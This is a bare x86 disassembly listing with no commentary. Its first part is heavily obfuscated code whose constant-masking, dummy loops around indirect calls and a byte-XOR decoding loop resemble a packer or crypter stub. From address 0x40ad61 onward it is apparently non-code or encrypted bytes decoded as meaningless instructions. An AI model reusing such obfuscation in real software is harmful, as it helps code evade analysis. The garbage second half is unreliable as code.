  40a692:	sub    ecx,eax
  40a694:	add    ecx,DWORD PTR [ebp-0xc]
  40a697:	mov    DWORD PTR [ebp-0xc],ecx
  40a69a:	mov    eax,DWORD PTR [ebp-0x8]
  40a69d:	cmp    eax,0xf89c85a5
  40a6a2:	jne    0x4038a5
  40a6a8:	mov    DWORD PTR [ebp-0x34],0x9
  40a6af:	mov    ecx,DWORD PTR [ebp+0x8]
  40a6b2:	xor    ecx,esi
  40a6b4:	add    ecx,edi
  40a6b6:	jmp    0x40a916
  40a6bb:	lea    eax,[ecx+ebx*1]
  40a6be:	mov    DWORD PTR [ebp-0x2c],eax
  40a6c1:	mov    eax,DWORD PTR [ebp-0x58]
  40a6c4:	sub    eax,ecx
  40a6c6:	mov    DWORD PTR [ebp-0x1c],eax
  40a6c9:	mov    eax,DWORD PTR [ebp-0x1c]
  40a6cc:	mov    DWORD PTR [ebp-0x14],eax
  40a6cf:	mov    eax,DWORD PTR [ebp-0x2c]
  40a6d2:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  40a6d9:	mov    DWORD PTR [ebp-0x54],eax
  40a6dc:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40a6e3:	mov    eax,DWORD PTR [ebp-0x38]
  40a6e6:	xor    eax,esi
  40a6e8:	add    eax,edi
  40a6ea:	mov    DWORD PTR [ebp-0x10],eax
  40a6ed:	mov    eax,DWORD PTR [ebp-0x38]
  40a6f0:	xor    eax,esi
  40a6f2:	add    eax,edi
  40a6f4:	mov    DWORD PTR [ebp-0x8],eax
  40a6f7:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  40a6fe:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40a705:	mov    eax,DWORD PTR [ebp-0x38]
  40a708:	mov    edx,DWORD PTR [ebp-0x14]
  40a70b:	xor    eax,esi
  40a70d:	add    eax,edi
  40a70f:	cmp    edx,eax
  40a711:	je     0x40a90a
  40a717:	mov    eax,DWORD PTR [ebp-0x20]
  40a71a:	xor    eax,esi
  40a71c:	mov    edx,0xffcd8d0f
  40a721:	sub    edx,eax
  40a723:	add    edx,DWORD PTR [ebp-0x14]
  40a726:	mov    eax,DWORD PTR [ebp-0x20]
  40a729:	mov    ebx,DWORD PTR [ebp-0x10]
  40a72c:	xor    eax,esi
  40a72e:	add    eax,edi
  40a730:	imul   eax,ebx
  40a733:	cmp    eax,edx
  40a735:	ja     0x40a907
  40a73b:	mov    edx,DWORD PTR [ebp-0x10]
  40a73e:	mov    eax,DWORD PTR [ebp-0x14]
  40a741:	mov    ebx,DWORD PTR [ebp-0x2c]
  40a744:	sub    eax,edx
  40a746:	xor    ebx,esi
  40a748:	xor    edx,edx
  40a74a:	add    ebx,edi
  40a74c:	div    ebx
  40a74e:	mov    DWORD PTR [ebp-0x8],eax
  40a751:	mov    eax,DWORD PTR [ebp-0x44]
  40a754:	mov    edx,DWORD PTR [ebp-0x8]
  40a757:	xor    eax,esi
  40a759:	add    eax,edi
  40a75b:	cmp    edx,eax
  40a75d:	jbe    0x40a76d
  40a763:	mov    eax,DWORD PTR [ebp-0x44]
  40a766:	xor    eax,esi
  40a768:	add    eax,edi
  40a76a:	mov    DWORD PTR [ebp-0x8],eax
  40a76d:	mov    eax,DWORD PTR [ebp-0x2c]
  40a770:	mov    edx,DWORD PTR [ebp-0x8]
  40a773:	xor    eax,esi
  40a775:	add    eax,edi
  40a777:	imul   eax,edx
  40a77a:	mov    DWORD PTR [ebp-0x8],eax
  40a77d:	mov    eax,DWORD PTR [ebp-0x38]
  40a780:	mov    edx,DWORD PTR [ebp-0x8]
  40a783:	xor    eax,esi
  40a785:	add    eax,edi
  40a787:	cmp    edx,eax
  40a789:	je     0x40a8f0
  40a78f:	mov    eax,DWORD PTR [ebp-0x8]
  40a792:	mov    DWORD PTR [ebp-0x18],eax
  40a795:	mov    eax,DWORD PTR [ebp-0x10]
  40a798:	add    eax,DWORD PTR [ebp-0x54]
  40a79b:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40a7a2:	mov    DWORD PTR [ebp-0x8],eax
  40a7a5:	mov    eax,0xf89c85ba
  40a7aa:	mov    DWORD PTR [ebp-0x28],eax
  40a7ad:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40a7b4:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  40a7bb:	mov    DWORD PTR [ebp-0x30],eax
  40a7be:	mov    eax,DWORD PTR [ebp-0x1c]
  40a7c1:	xor    eax,esi
  40a7c3:	add    eax,edi
  40a7c5:	jmp    0x40a8ac
  40a7ca:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  40a7d1:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  40a7d8:	mov    eax,DWORD PTR [ebp-0x30]
  40a7db:	mov    edx,DWORD PTR [ebp-0xc]
  40a7de:	xor    eax,esi
  40a7e0:	add    eax,edi
  40a7e2:	imul   eax,edx
  40a7e5:	mov    edx,DWORD PTR [ebp-0x8]
  40a7e8:	mov    al,BYTE PTR [eax+edx*1]
  40a7eb:	mov    BYTE PTR [ebp-0x1],al
  40a7ee:	mov    eax,DWORD PTR [ebp-0x30]
  40a7f1:	mov    edx,DWORD PTR [ebp-0xc]
  40a7f4:	xor    eax,esi
  40a7f6:	add    eax,edi
  40a7f8:	imul   eax,edx
  40a7fb:	mov    edx,DWORD PTR [ebp-0x5c]
  40a7fe:	xor    edx,esi
  40a800:	add    eax,edx
  40a802:	mov    edx,DWORD PTR [ebp-0x8]
  40a805:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a80d:	mov    edx,DWORD PTR [ebp-0x4c]
  40a810:	xor    edx,esi
  40a812:	lea    eax,[edx+eax*1+0x3272f1]
  40a819:	movzx  edx,BYTE PTR [ebp-0x1]
  40a81d:	xor    edx,eax
  40a81f:	mov    BYTE PTR [ebp-0x1],dl
  40a822:	mov    al,BYTE PTR [ebp-0x1]
  40a825:	mov    edx,DWORD PTR [ebp-0x30]
  40a828:	mov    ebx,DWORD PTR [ebp-0xc]
  40a82b:	xor    edx,esi
  40a82d:	add    edx,edi
  40a82f:	imul   edx,ebx
  40a832:	mov    ebx,DWORD PTR [ebp-0x8]
  40a835:	mov    BYTE PTR [edx+ebx*1],al
  40a838:	mov    eax,DWORD PTR [ebp-0x30]
  40a83b:	mov    edx,DWORD PTR [ebp-0xc]
  40a83e:	xor    eax,esi
  40a840:	add    eax,edi
  40a842:	imul   eax,edx
  40a845:	mov    edx,DWORD PTR [ebp-0x8]
  40a848:	mov    al,BYTE PTR [eax+edx*1]
  40a84b:	mov    BYTE PTR [ebp-0x1],al
  40a84e:	mov    eax,DWORD PTR [ebp-0x30]
  40a851:	mov    edx,DWORD PTR [ebp-0xc]
  40a854:	xor    eax,esi
  40a856:	add    eax,edi
  40a858:	imul   eax,edx
  40a85b:	mov    edx,DWORD PTR [ebp-0x28]
  40a85e:	xor    edx,esi
  40a860:	add    eax,edx
  40a862:	mov    edx,DWORD PTR [ebp-0x8]
  40a865:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a86d:	mov    edx,DWORD PTR [ebp-0x50]
  40a870:	xor    edx,esi
  40a872:	lea    eax,[edx+eax*1+0x3272f1]
  40a879:	movzx  edx,BYTE PTR [ebp-0x1]
  40a87d:	xor    edx,eax
  40a87f:	mov    BYTE PTR [ebp-0x1],dl
  40a882:	mov    al,BYTE PTR [ebp-0x1]
  40a885:	mov    edx,DWORD PTR [ebp-0x30]
  40a888:	mov    ebx,DWORD PTR [ebp-0xc]
  40a88b:	xor    edx,esi
  40a88d:	add    edx,edi
  40a88f:	imul   edx,ebx
  40a892:	mov    ebx,DWORD PTR [ebp-0x8]
  40a895:	mov    BYTE PTR [edx+ebx*1],al
  40a898:	mov    eax,DWORD PTR [ebp-0x40]
  40a89b:	mov    edx,DWORD PTR [ebp-0x28]
  40a89e:	xor    eax,esi
  40a8a0:	xor    edx,esi
  40a8a2:	add    eax,edi
  40a8a4:	add    edx,edi
  40a8a6:	imul   eax,edx
  40a8a9:	add    eax,DWORD PTR [ebp-0xc]
  40a8ac:	mov    DWORD PTR [ebp-0xc],eax
  40a8af:	mov    eax,DWORD PTR [ebp-0xc]
  40a8b2:	mov    edx,DWORD PTR [ebp-0x18]
  40a8b5:	cmp    edx,eax
  40a8b7:	jb     0x40a7ca
  40a8bd:	mov    eax,DWORD PTR [ebp-0x28]
  40a8c0:	mov    edx,DWORD PTR [ebp-0x18]
  40a8c3:	xor    eax,esi
  40a8c5:	add    eax,edi
  40a8c7:	imul   eax,edx
  40a8ca:	mov    edx,DWORD PTR [ebp-0x1c]
  40a8cd:	xor    edx,esi
  40a8cf:	add    edx,edi
  40a8d1:	or     eax,edx
  40a8d3:	mov    edx,DWORD PTR [ebp-0x20]
  40a8d6:	xor    edx,esi
  40a8d8:	add    eax,edx
  40a8da:	mov    edx,DWORD PTR [ebp-0x20]
  40a8dd:	xor    edx,esi
  40a8df:	add    eax,edx
  40a8e1:	mov    edx,DWORD PTR [ebp-0x10]
  40a8e4:	lea    eax,[eax+edx*1+0x64e5e2]
  40a8eb:	jmp    0x40a8ff
  40a8f0:	mov    eax,DWORD PTR [ebp-0x20]
  40a8f3:	mov    edx,DWORD PTR [ebp-0x10]
  40a8f6:	xor    eax,esi
  40a8f8:	lea    eax,[eax+edx*1+0x3272f1]
  40a8ff:	mov    DWORD PTR [ebp-0x10],eax
  40a902:	jmp    0x40a717
  40a907:	mov    ebx,DWORD PTR [ebp-0x3c]
  40a90a:	mov    eax,DWORD PTR [ebp+0xc]
  40a90d:	xor    eax,esi
  40a90f:	lea    ecx,[ecx+eax*1+0x3272f1]
  40a916:	lea    eax,[ecx-0x3272f1]
  40a91c:	xor    eax,esi
  40a91e:	cmp    eax,0xf89c95a5
  40a923:	jne    0x40a6bb
  40a929:	dec    DWORD PTR [ebp-0x34]
  40a92c:	jne    0x40a6af
  40a932:	mov    eax,DWORD PTR [ebp+0x8]
  40a935:	mov    ecx,DWORD PTR [ebp+0xc]
  40a938:	mov    edx,DWORD PTR [ebp+0x8]
  40a93b:	xor    ecx,esi
  40a93d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  40a944:	xor    eax,esi
  40a946:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  40a94d:	xor    edx,esi
  40a94f:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  40a956:	mov    ecx,DWORD PTR [ebp+0xc]
  40a959:	xor    ecx,esi
  40a95b:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  40a962:	mov    eax,DWORD PTR [ebp+0xc]
  40a965:	xor    eax,esi
  40a967:	add    eax,edi
  40a969:	pop    edi
  40a96a:	pop    esi
  40a96b:	pop    ebx
  40a96c:	leave  
  40a96d:	ret    0x8
  40a970:	and    DWORD PTR ds:0x42a2e6,0x42a28a
  40a97a:	xor    eax,eax
  40a97c:	sbb    DWORD PTR ds:0x42a2c2,0x42a2ae
  40a986:	inc    eax
  40a987:	ret    
  40a988:	push   ebp
  40a989:	mov    ebp,esp
  40a98b:	sub    esp,0x38
  40a98e:	movzx  eax,WORD PTR ds:0x42a2f6
  40a995:	sbb    DWORD PTR ds:0x42a276,eax
  40a99b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40a9a2:	push   ebx
  40a9a3:	add    DWORD PTR ds:0x42a2e6,0x20e2
  40a9ad:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  40a9b4:	and    DWORD PTR ds:0x42a2be,0x0
  40a9be:	jmp    0x40a9d1
  40a9c3:	xor    eax,eax
  40a9c5:	or     eax,DWORD PTR ds:0x42a2be
  40a9cb:	inc    eax
  40a9cc:	mov    ds:0x42a2be,eax
  40a9d1:	cmp    DWORD PTR ds:0x42a2be,0x1e
  40a9d8:	jae    0x40aa03
  40a9de:	cmp    DWORD PTR ds:0x42a2be,0x1f
  40a9e5:	jge    0x40aa03
  40a9eb:	jmp    0x40a9fe
  40a9f0:	push   DWORD PTR [ebp-0x1c]
  40a9f3:	push   0x42a2de
  40a9f8:	call   DWORD PTR ds:0x42a3fa
  40a9fe:	jmp    0x40a9c3
  40aa03:	mov    eax,DWORD PTR [ebp-0x4]
  40aa06:	or     DWORD PTR ds:0x42a296,0x3f2f
  40aa10:	push   esi
  40aa11:	xor    esi,esi
  40aa13:	xor    esi,DWORD PTR ds:0x42a2f2
  40aa19:	or     esi,DWORD PTR ds:0x42a28e
  40aa1f:	mov    DWORD PTR ds:0x42a2f2,esi
  40aa25:	mov    esi,0x75108aa
  40aa2a:	xor    eax,esi
  40aa2c:	push   edi
  40aa2d:	mov    DWORD PTR ds:0x42a2ce,0x1b
  40aa37:	cmp    DWORD PTR ds:0x42a2ce,0x0
  40aa3e:	je     0x40aa8f
  40aa44:	cmp    DWORD PTR ds:0x42a2ce,0x4
  40aa4b:	jb     0x40aa8f
  40aa51:	jmp    0x40aa61
  40aa56:	push   0x724e
  40aa5b:	call   DWORD PTR ds:0x42a3d6
  40aa61:	cmp    DWORD PTR ds:0x42a2ce,0x5
  40aa68:	jne    0x40aa7d
  40aa6e:	xor    edi,edi
  40aa70:	xor    edi,DWORD PTR ds:0x42a2ce
  40aa76:	dec    edi
  40aa77:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa7d:	mov    edi,DWORD PTR ds:0x42a2ce
  40aa83:	dec    edi
  40aa84:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa8a:	jmp    0x40aa37
  40aa8f:	mov    edi,0x3272f1
  40aa94:	add    eax,edi
  40aa96:	mov    DWORD PTR [ebp-0x1c],eax
  40aa99:	and    DWORD PTR ds:0x42a26e,0x0
  40aaa3:	jmp    0x40aab3
  40aaa8:	mov    eax,ds:0x42a26e
  40aaad:	inc    eax
  40aaae:	mov    ds:0x42a26e,eax
  40aab3:	cmp    DWORD PTR ds:0x42a26e,0x1b
  40aaba:	jae    0x40aae6
  40aac0:	cmp    DWORD PTR ds:0x42a26e,0x24
  40aac7:	ja     0x40aae6
  40aacd:	jmp    0x40aae1
  40aad2:	push   DWORD PTR [ebp-0x24]
  40aad5:	push   DWORD PTR [ebp-0x1c]
  40aad8:	push   DWORD PTR [ebp-0x28]
  40aadb:	call   DWORD PTR ds:0x42a3da
  40aae1:	jmp    0x40aaa8
  40aae6:	mov    eax,DWORD PTR [ebp+0x14]
  40aae9:	sub    DWORD PTR ds:0x42a28a,0x606e
  40aaf3:	test   eax,eax
  40aaf5:	je     0x40ab5c
  40aafb:	mov    eax,DWORD PTR [ebp+0x14]
  40aafe:	mov    eax,DWORD PTR [eax]
  40ab00:	and    DWORD PTR ds:0x42a2fe,0x0
  40ab0a:	jmp    0x40ab1c
  40ab0f:	mov    ebx,DWORD PTR ds:0x42a2fe
  40ab15:	inc    ebx
  40ab16:	mov    DWORD PTR ds:0x42a2fe,ebx
  40ab1c:	cmp    DWORD PTR ds:0x42a2fe,0x11
  40ab23:	jae    0x40ab59
  40ab29:	cmp    DWORD PTR ds:0x42a2fe,0x1c
  40ab30:	jge    0x40ab59
  40ab36:	jmp    0x40ab54
  40ab3b:	push   DWORD PTR [ebp-0x20]
  40ab3e:	push   DWORD PTR [ebp-0x10]
  40ab41:	push   0x1b8e
  40ab46:	push   DWORD PTR [ebp-0xc]
  40ab49:	push   0x42a28e
  40ab4e:	call   DWORD PTR ds:0x42a3de
  40ab54:	jmp    0x40ab0f
  40ab59:	mov    DWORD PTR [ebp-0x1c],eax
  40ab5c:	sub    DWORD PTR ds:0x42a2f2,0x6975
  40ab66:	mov    eax,DWORD PTR [ebp-0x4]
  40ab69:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  40ab73:	xor    eax,esi
  40ab75:	add    eax,edi
  40ab77:	mov    ebx,DWORD PTR ds:0x42a306
  40ab7d:	mov    ebx,DWORD PTR [ebx]
  40ab7f:	and    DWORD PTR ds:0x42a2e6,ebx
  40ab85:	mov    DWORD PTR [ebp-0x8],eax
  40ab88:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  40ab92:	mov    eax,DWORD PTR [ebp-0xc]
  40ab95:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  40ab9f:	xor    eax,esi
  40aba1:	add    eax,edi
  40aba3:	dec    DWORD PTR ds:0x42a2be
  40aba9:	mov    DWORD PTR [ebp-0x24],eax
  40abac:	mov    eax,DWORD PTR [ebp-0x4]
  40abaf:	and    DWORD PTR ds:0x42a2be,0x0
  40abb9:	jmp    0x40abcb
  40abbe:	mov    ebx,DWORD PTR ds:0x42a2be
  40abc4:	inc    ebx
  40abc5:	mov    DWORD PTR ds:0x42a2be,ebx
  40abcb:	cmp    DWORD PTR ds:0x42a2be,0x13
  40abd2:	jae    0x40ac19
  40abd8:	cmp    DWORD PTR ds:0x42a2be,0x4
  40abdf:	jb     0x40ac19
  40abe5:	jmp    0x40abfa
  40abea:	push   0x68db
  40abef:	push   0x42a266
  40abf4:	call   DWORD PTR ds:0x42a40a
  40abfa:	cmp    DWORD PTR ds:0x42a2be,0x3
  40ac01:	jne    0x40ac14
  40ac07:	mov    ebx,DWORD PTR ds:0x42a2be
  40ac0d:	inc    ebx
  40ac0e:	mov    DWORD PTR ds:0x42a2be,ebx
  40ac14:	jmp    0x40abbe
  40ac19:	xor    eax,esi
  40ac1b:	movzx  ebx,WORD PTR ds:0x42a266
  40ac22:	or     DWORD PTR ds:0x42a2ae,ebx
  40ac28:	add    eax,edi
  40ac2a:	mov    DWORD PTR [ebp-0x30],eax
  40ac2d:	mov    ebx,DWORD PTR [ebp-0x4]
  40ac30:	sbb    DWORD PTR ds:0x42a2c2,edi
  40ac36:	xor    ebx,esi
  40ac38:	and    DWORD PTR ds:0x42a292,0x0
  40ac42:	jmp    0x40ac52
  40ac47:	mov    eax,ds:0x42a292
  40ac4c:	inc    eax
  40ac4d:	mov    ds:0x42a292,eax
  40ac52:	cmp    DWORD PTR ds:0x42a292,0x1c
  40ac59:	jae    0x40ac82
  40ac5f:	cmp    DWORD PTR ds:0x42a292,0x26
  40ac66:	jbe    0x40ac82
  40ac6c:	jmp    0x40ac7d
  40ac71:	push   DWORD PTR [ebp-0x1c]
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42a3e2
  40ac7d:	jmp    0x40ac47
  40ac82:	add    ebx,edi
  40ac84:	mov    eax,DWORD PTR [ebp-0x24]
  40ac87:	sbb    DWORD PTR ds:0x42a2d2,0x3c99
  40ac91:	sub    eax,edi
  40ac93:	adc    DWORD PTR ds:0x42a2be,0x42a266
  40ac9d:	lea    ecx,[ebx-0x3272f1]
  40aca3:	inc    DWORD PTR ds:0x42a272
  40aca9:	xor    eax,esi
  40acab:	xor    ecx,esi
  40acad:	cmp    ecx,eax
  40acaf:	mov    DWORD PTR ds:0x42a28e,0x7ce
  40acb9:	je     0x40f5ba
  40acbf:	mov    eax,DWORD PTR [ebp-0x4]
  40acc2:	xor    eax,esi
  40acc4:	add    eax,edi
  40acc6:	mov    DWORD PTR ds:0x42a2be,0x2860
  40acd0:	cmp    ebx,eax
  40acd2:	jne    0x40f597
  40acd8:	xor    DWORD PTR ds:0x42a27e,0x42a2f2
  40ace2:	push   DWORD PTR [ebp+0x8]
  40ace5:	call   0x424fb7
  40acea:	mov    DWORD PTR [ebp-0x14],eax
  40aced:	and    DWORD PTR ds:0x42a2ca,0x0
  40acf7:	jmp    0x40ad07
  40acfc:	mov    eax,ds:0x42a2ca
  40ad01:	inc    eax
  40ad02:	mov    ds:0x42a2ca,eax
  40ad07:	cmp    DWORD PTR ds:0x42a2ca,0x1f
  40ad0e:	jae    0x40ad4c
  40ad14:	cmp    DWORD PTR ds:0x42a2ca,0xa
  40ad1b:	jge    0x40ad4c
  40ad21:	jmp    0x40ad2f
  40ad26:	push   DWORD PTR [ebp-0x18]
  40ad29:	call   DWORD PTR ds:0x42a3ea
  40ad2f:	cmp    DWORD PTR ds:0x42a2ca,0x9
  40ad36:	jne    0x40ad47
  40ad3c:	mov    eax,ds:0x42a2ca
  40ad41:	inc    eax
  40ad42:	mov    ds:0x42a2ca,eax
  40ad47:	jmp    0x40acfc
  40ad4c:	mov    eax,DWORD PTR [ebp-0x4]
  40ad4f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad52:	add    DWORD PTR ds:0x42a2a6,0x42a28e
  40ad5c:	jmp    0x40d0d8
  40ad61:	sub    bl,BYTE PTR [ebp-0xd]
  40ad64:	mov    BYTE PTR es:[esi+0x15a851a2],al
  40ad6b:	pop    ds
  40ad6c:	cmp    DWORD PTR [edi-0x4c],0x57
  40ad70:	sub    al,0x33
  40ad72:	icebp  
  40ad73:	add    DWORD PTR [ebx-0x7c7ca1de],0x3b
  40ad7a:	or     eax,0x78d512ab
  40ad7f:	int3   
  40ad80:	into   
  40ad81:	fwait
  40ad82:	sub    cl,BYTE PTR [ebx+0x1b95211]
  40ad88:	stc    
  40ad89:	dec    eax
  40ad8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8b:	add    al,0x59
  40ad8d:	add    BYTE PTR [esi-0x5415ca8f],bh
  40ad93:	shl    BYTE PTR [ecx+0x72c53266],1
  40ad99:	inc    esp
  40ad9a:	call   0xf167:0xcd399fee
  40ada1:	cld    
  40ada2:	sbb    al,0x35
  40ada4:	in     eax,dx
  40ada5:	call   0x38dd9e97
  40adaa:	les    edx,FWORD PTR [esi+eiz*8-0x43]
  40adae:	xor    eax,0xb6814588
  40adb3:	jmp    0x40ad66
  40adb5:	push   edx
  40adb6:	js     0x40add8
  40adb8:	mov    eax,0x14bb0bc4
  40adbd:	adc    eax,0x7549160c
  40adc2:	add    dl,BYTE PTR ds:0xe8cb6717
  40adc8:	(bad)  
  40adc9:	ret    0xd436
  40adcc:	loopne 0x40ae19
  40adce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adcf:	jle    0x40add0
  40add1:	or     al,0x41
  40add3:	jns    0x40ae0d
  40add5:	mov    ss,WORD PTR [esi]
  40add7:	mov    al,ds:0xa0881382
  40addc:	nop
  40addd:	in     al,0x9e
  40addf:	enter  0xfbfb,0x17
  40ade3:	ds and eax,0x4273c719
  40ade9:	fcom   DWORD PTR [ebx+eiz*1+0x3af79064]
  40adf0:	pop    edi
  40adf1:	jo     0x40ae04
  40adf3:	and    DWORD PTR [edx],esp
  40adf5:	jmp    0x40ada4
  40adf7:	icebp  
  40adf8:	out    dx,al
  40adf9:	cmc    
  40adfa:	and    al,0x45
  40adfc:	stos   BYTE PTR es:[edi],al
  40adfd:	push   0x65c41bb8
  40ae02:	adc    bl,ah
  40ae04:	icebp  
  40ae05:	xchg   esi,eax
  40ae06:	retf   0xbc3f
  40ae09:	jmp    0x40ae71
  40ae0b:	push   0x82bb1cde
  40ae10:	dec    ecx
  40ae11:	rcr    bh,cl
  40ae13:	or     al,0xaf
  40ae15:	mov    ds:0x5b2ca2a,al
  40ae1a:	adc    BYTE PTR [edx+0x50ee150],al
  40ae20:	popf   
  40ae21:	cdq    
  40ae22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae23:	xchg   esi,eax
  40ae24:	jl     0x40ae0b
  40ae26:	lods   al,BYTE PTR ds:[esi]
  40ae27:	sbb    cl,BYTE PTR [ecx+0x3]
  40ae2a:	loopne 0x40ae93
  40ae2c:	xchg   esp,eax
  40ae2d:	or     eax,0xbb933f4e
  40ae32:	mov    esp,0x9acd05ba
  40ae37:	inc    ecx
  40ae38:	mov    ecx,0xab9128c7
  40ae3d:	(bad)  
  40ae3e:	inc    esp
  40ae3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae40:	mov    ds:0xd34e053,eax
  40ae45:	call   0x205bc6cb
  40ae4a:	fadd   DWORD PTR [edx+0x7]
  40ae4d:	xchg   edi,eax
  40ae4e:	inc    eax
  40ae4f:	mov    al,0x5e
  40ae51:	scas   eax,DWORD PTR es:[edi]
  40ae52:	jle    0x40adf1
  40ae54:	xor    BYTE PTR ds:0xafff8831,ah
  40ae5a:	mov    bh,0x64
  40ae5c:	mov    ecx,ebx
  40ae5e:	je     0x40aeb6
  40ae60:	test   al,0x6a
  40ae62:	xor    bl,BYTE PTR [edx+eiz*2+0x3b]
  40ae66:	int3   
  40ae67:	jno    0x40ae7c
  40ae69:	add    BYTE PTR [ecx],ch
  40ae6b:	aad    0xc9
  40ae6d:	inc    esi
  40ae6e:	jl     0x40ae7f
  40ae70:	hlt    
  40ae71:	dec    edx
  40ae72:	mov    esp,0x5d6dfed3
  40ae77:	xor    eax,0xe1060640
  40ae7c:	repnz and DWORD PTR [edx],esp
  40ae7f:	add    edi,DWORD PTR [edx-0x79d24740]
  40ae85:	push   esp
  40ae86:	jecxz  0x40ae59
  40ae88:	and    al,0x60
  40ae8a:	lea    esi,[edx+edx*8-0x57cdb381]
  40ae91:	repnz int3 
  40ae93:	pop    es
  40ae94:	(bad)  
  40ae95:	push   0xffffffd6
  40ae97:	aas    
  40ae98:	je     0x40ae58
  40ae9a:	in     eax,dx
  40ae9b:	(bad)  
  40ae9c:	adc    al,0x58
  40ae9e:	mov    bl,ch
  40aea0:	or     DWORD PTR [ecx+0x48],ebp
  40aea3:	in     al,0xc3
  40aea5:	fnstcw WORD PTR [ecx-0x5a]
  40aea8:	(bad)  
  40aea9:	cmc    
  40aeaa:	outs   dx,BYTE PTR ds:[esi]
  40aeab:	js     0x40ae3b
  40aead:	call   0x52523ae5
  40aeb2:	aaa    
  40aeb3:	xor    eax,0xb6407c2
  40aeb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeb9:	(bad)  
  40aeba:	pop    ebp
  40aebb:	(bad)  
  40aebd:	jnp    0x40ae84
  40aebf:	call   0xccc614fb
  40aec4:	aam    0x22
  40aec6:	mov    bh,0x75
  40aec8:	jb     0x40ae52
  40aeca:	or     DWORD PTR [ebx],0x7f0a035a
  40aed0:	in     al,0x2f
  40aed2:	xor    eax,0x968350d4
  40aed7:	push   cs
  40aed8:	mov    eax,ds:0x4f49edc
  40aedd:	pop    esp
  40aede:	(bad)  
  40aedf:	mov    ah,0xca
  40aee1:	ret    
  40aee2:	cs (bad) 
  40aee4:	xor    DWORD PTR [ebx],esi
  40aee6:	dec    ebp
  40aee7:	(bad)  [ecx]
  40aee9:	aaa    
  40aeea:	retfw  0xdd3b
  40aeee:	int3   
  40aeef:	dec    edi
  40aef0:	retf   
  40aef1:	lock js 0x40af5f
  40aef4:	push   ds
  40aef5:	and    BYTE PTR [esi],cl
  40aef7:	(bad)  
  40aef9:	ret    
  40aefa:	int    0x23
  40aefc:	call   0x899e:0x824d1f66
  40af03:	mov    edi,0x96fd07f0
  40af08:	bound  edi,QWORD PTR [edx-0x54]
  40af0b:	mov    bh,0x4d
  40af0d:	inc    ebx
  40af0e:	stc    
  40af0f:	xlat   BYTE PTR ds:[ebx]
  40af10:	bound  ebp,QWORD PTR [edi+edx*4-0x286b0e78]
  40af17:	mov    al,ds:0xcc3b293c
  40af1c:	arpl   si,bp
  40af1e:	out    0x3,eax
  40af20:	jmp    0x40aeb0
  40af22:	adc    BYTE PTR [eax],cl
  40af24:	fisubr DWORD PTR [ebx+0x473c183b]
  40af2a:	xchg   BYTE PTR [ebx-0x61c2c1b3],ch
  40af30:	push   0xb
  40af32:	xchg   ecx,eax
  40af33:	add    ebp,eax
  40af35:	jmp    0xf8e5bdd0
  40af3a:	jl     0x40aed6
  40af3c:	cdq    
  40af3d:	sub    ecx,DWORD PTR [ebx-0x4c]
  40af40:	arpl   WORD PTR [eax+0x0],ax
  40af43:	lock dec edi
  40af45:	jmp    0x68d3:0x5f230a96
  40af4c:	cmp    al,0xb0
  40af4e:	test   al,0x25
  40af50:	cmp    edi,DWORD PTR [edi+0x333ed5dc]
  40af56:	adc    ecx,DWORD PTR [eax-0x36]
  40af59:	arpl   bp,cx
  40af5b:	dec    esi
  40af5c:	or     eax,0x44447ce9
  40af61:	shr    bl,cl
  40af63:	fist   DWORD PTR [ecx+0x7b]
  40af66:	inc    ebp
  40af67:	push   ecx
  40af68:	andnps xmm4,XMMWORD PTR [ebx-0x3d]
  40af6c:	out    0x28,eax
  40af6e:	xchg   edx,eax
  40af6f:	pop    edx
  40af70:	lahf   
  40af71:	xor    eax,ecx
  40af73:	push   edx
  40af74:	pop    esp
  40af75:	outs   dx,DWORD PTR ds:[esi]
  40af76:	sub    BYTE PTR [ecx+0x3af5eead],bh
  40af7c:	gs xchg esi,eax
  40af7e:	shl    BYTE PTR [ebx],1
  40af80:	push   esi
  40af81:	repnz (bad) 
  40af83:	cli    
  40af84:	sahf   
  40af85:	test   eax,0xb1bed8b7
  40af8a:	retf   0x74ca
  40af8d:	mov    eax,0xda674cc1
  40af92:	add    al,0xb8
  40af94:	mov    bl,dl
  40af96:	cmp    eax,0xfc4db0fe
  40af9b:	pusha  
  40af9c:	rcr    BYTE PTR [edx],0x72
  40af9f:	add    edi,DWORD PTR [edx]
  40afa1:	mov    edi,0x62ca2eac
  40afa6:	repnz mov ebx,DWORD PTR [edx+0x19c768ad]
  40afad:	sub    al,0x58
  40afaf:	mov    DWORD PTR [eax+0x1a5260dc],edi
  40afb5:	(bad)  
  40afb6:	loop   0x40affa
  40afb8:	push   ds
  40afb9:	aad    0xac
  40afbb:	inc    edx
  40afbc:	hlt    
  40afbd:	push   esi
  40afbe:	cmc    
  40afbf:	sub    ch,BYTE PTR ds:0xaecddfb0
  40afc5:	pop    eax
  40afc6:	jecxz  0x40af63
  40afc8:	ja     0x40b01e
  40afca:	push   0xffffff8a
  40afcc:	jmp    0x3abc13f9
  40afd1:	and    DWORD PTR ds:0x9e95031f,0x20
